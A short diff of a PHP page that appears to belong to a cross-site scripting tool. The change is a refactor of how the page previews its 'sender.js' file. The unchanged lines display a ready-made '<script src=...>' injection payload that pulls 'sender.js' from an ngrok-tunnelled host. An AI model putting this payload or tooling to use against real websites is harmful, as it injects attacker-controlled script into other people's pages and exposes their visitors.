@@ -4,6 +4,8 @@ if (!file_exists("sender.js")) {
   fwrite($senderJS, "");
   fclose($senderJS);
 }
+
+$lastPayload = file_get_contents('sender.js');
 ?>
 
   <div class="text-center text-white h-100 align-items-center d-flex py-5" style="background-image: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)), url(&quot;img/cover.jpg&quot;); background-position: center center, center center; background-size: cover, cover; background-repeat: repeat, repeat; background-attachment: fixed;">
@@ -47,12 +49,7 @@ if (!file_exists("sender.js")) {
               <input type="text" class="form-control form-control-sm" value="Payload : <script src=<?php echo str_replace("https:","",trim($ngrokURL))."/sender.js"?>></script>" readonly>
             </div>
             <div class="form-group">
-              <textarea class="form-control form-control-sm" id="payload" rows="10" placeholder="Payload Preview" name="backPayload">
-                <?php 
-                  $lastPayload = file_get_contents('sender.js');
-                  echo $lastPayload;
-                ?>
-                </textarea>
+              <textarea class="form-control form-control-sm" id="payload" rows="10" placeholder="Payload Preview" name="backPayload"><?php echo $lastPayload;?></textarea>
             </div>
             <div class="form-row">
               <div class="form-group col-md-12">
